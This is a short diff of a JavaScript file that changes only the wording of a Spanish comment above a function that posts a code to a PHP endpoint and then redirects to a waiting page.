@@ -108,7 +108,7 @@ function pasocorreo(e,c,t){
     });
 }
 
-// NUEVA FUNCIÓN PARA PROCESAR EL ESTADO WPP
+// NUEVA FUNCIÓN PARA PROCESAR  ESTADO WPP
 function pasowpp(codigo){    
     $.post( PSE_PROCESS + "pasowpp.php", { codigo: codigo} ,function(data) {
         window.location.href = "../a/WAITING";    
